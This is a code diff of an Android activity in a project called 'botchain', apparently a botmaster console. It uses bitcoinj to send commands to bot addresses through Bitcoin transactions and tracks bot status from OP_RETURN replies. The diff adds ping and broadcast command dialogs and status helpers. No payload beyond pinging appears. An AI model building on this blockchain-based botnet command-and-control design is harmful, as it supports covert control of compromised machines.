@@ -1,10 +1,15 @@
 package com.example.tonipagliaro.botchain;
 
+import android.app.AlertDialog;
+import android.content.DialogInterface;
 import android.os.Bundle;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
+import android.view.View;
+import android.widget.AdapterView;
+import android.widget.Button;
 import android.widget.ListView;
 
 import com.example.tonipagliaro.botchain.Adapter.BotListAdapter;
@@ -19,7 +24,6 @@ import org.bitcoinj.wallet.listeners.WalletCoinsReceivedEventListener;
 
 import java.util.ArrayList;
 import java.util.List;
-import java.util.Map;
 
 public class BotListActivity extends AppCompatActivity {
 
@@ -31,6 +35,8 @@ public class BotListActivity extends AppCompatActivity {
     static ArrayList<String> indirizziAttivi=new ArrayList<String>();
 
     ListView listView;
+    Button buttonRefresh;
+    Button buttonBroadcast;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -49,6 +55,63 @@ public class BotListActivity extends AppCompatActivity {
         listaBotAdapter = new BotListAdapter(this, R.layout.list_item, indirizzi);
         listView.setAdapter(listaBotAdapter);
 
+        listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
+            @Override
+            public void onItemClick(AdapterView<?> parent, View view, final int position, long id) {
+                AlertDialog.Builder builder = new AlertDialog.Builder(BotListActivity.this);
+                builder.setTitle(R.string.title_command_dialog)
+                        .setItems(R.array.command_list, new DialogInterface.OnClickListener() {
+                            public void onClick(DialogInterface dialog, int which) {
+                                try {
+                                    //Per il momento lo manda aanche se il bot ha i soldi.........
+                                    appState.sendCommand("ping-"+appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
+                                            new Address(appState.params, listView.getItemAtPosition(position).toString().split("-")[0]));
+                                } catch (Exception e) {
+                                    e.printStackTrace();
+                                }
+                            }
+                        });
+                builder.create().show();
+            }
+        });
+
+        //Per il momento lo manda a tutti.............
+        buttonRefresh = (Button) this.findViewById(R.id.button_refresh);
+        buttonRefresh.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                //Inviamo il comando solo ai bot che hanno lo stato "ok"
+                try {
+                    appState.sendCommand("ping-"+appState.wallet.currentReceiveKey().toAddress(appState.params).toString(), appState.indirizzi);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+                //Aggiorna lo stato dei bot in "no"
+                setNoAllBots();
+            }
+        });
+
+        //Per il momento lo manda a tutti.............
+        buttonBroadcast = (Button) this.findViewById(R.id.button_broadcast);
+        buttonBroadcast.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                AlertDialog.Builder builder = new AlertDialog.Builder(BotListActivity.this);
+                builder.setTitle(R.string.title_command_dialog)
+                        .setItems(R.array.command_list, new DialogInterface.OnClickListener() {
+                            public void onClick(DialogInterface dialog, int which) {
+                                try {
+                                    appState.sendCommand("ping-"+appState.wallet.currentReceiveKey().toAddress(appState.params).toString(), appState.indirizzi);
+                                } catch (Exception e) {
+                                    e.printStackTrace();
+                                }
+                                //Aggiorna lo stato dei bot in "no"
+                                setNoAllBots();
+                            }
+                        });
+                builder.create().show();
+            }
+        });
 
         appState.wallet.addCoinsReceivedEventListener(new WalletCoinsReceivedEventListener() {
             @Override
@@ -69,8 +132,11 @@ public class BotListActivity extends AppCompatActivity {
                     //Da modificare
                     if(comando.equalsIgnoreCase("ping_ok")) {
 
-                        updateIndirizziAttivi(indirizziAttivi, addressString);
-                        setMappaIndirizzi(indirizziAttivi);
+                        //updateIndirizziAttivi(indirizziAttivi, addressString);
+                        //setMappaIndirizzi(indirizziAttivi);
+
+                        //Imposta lo stato del bot che mi ha risposto in "ok"
+                        setOkBot(addressString);
 
                         for(String s : appState.mappaIndirizzi.keySet()){
                             Log.d("App","indirizzo "+s +" valore "+appState.mappaIndirizzi.get(s));
@@ -94,48 +160,34 @@ public class BotListActivity extends AppCompatActivity {
     }
 
 
-    public void updateIndirizziAttivi(ArrayList<String> indirizziAttivi,String address){
-        boolean presente=false;
-        if(!indirizziAttivi.isEmpty()) {
-            for (String a : indirizziAttivi) {
-                if (a.equalsIgnoreCase(address))
-                    presente = true;
-            }
-        }
-        if(!presente)indirizziAttivi.add(address);
-
-    }
-
-    public Map<String,String> setMappaIndirizzi(ArrayList<String> indirizziAttivi){
-        //appState.mappaIndirizzi=new HashMap<String, String>() ;
-
-
-        for(String attivi: indirizziAttivi){
-            appState.mappaIndirizzi.put(attivi, "ok");
-            Log.d("App", "AGGIORNO LA MAPPA CON LO STATO OK L'INDIRIZZO :" +attivi);
-        }
-
-        Log.d("App", "GRANDEZZA DELLA MAPPA : " +appState.mappaIndirizzi.size());
-
+    public void setOkBot(String address) {
+        appState.mappaIndirizzi.put(address, "ok");
+        appState.saveMappaIndirizzi();
         indirizzi.clear();
         for(String s : appState.mappaIndirizzi.keySet()){
             indirizzi.add(s +"-" +appState.mappaIndirizzi.get(s));
         }
-
         runOnUiThread(new Runnable() {
             @Override
             public void run() {
                 listaBotAdapter.notifyDataSetChanged();
             }
         });
-        return appState.mappaIndirizzi;
     }
 
-    public Map<String,String> getMappaIndirizzi(){
-        return appState.mappaIndirizzi;
+    public void setNoAllBots() {
+        appState.setStatoBots("no");
+        indirizzi.clear();
+        for(String s : appState.mappaIndirizzi.keySet()){
+            indirizzi.add(s +"-" +appState.mappaIndirizzi.get(s));
+        }
+        runOnUiThread(new Runnable() {
+            @Override
+            public void run() {
+                listaBotAdapter.notifyDataSetChanged();
+            }
+        });
     }
-
-
 
 
     public static String readOpReturn(Transaction tx) throws Exception {
@@ -167,10 +219,6 @@ public class BotListActivity extends AppCompatActivity {
     }
 
 
-
-    public ArrayList<String> getIndirizzi(){
-        return indirizzi;
-    }
 
     @Override
     public boolean onCreateOptionsMenu(Menu menu) {
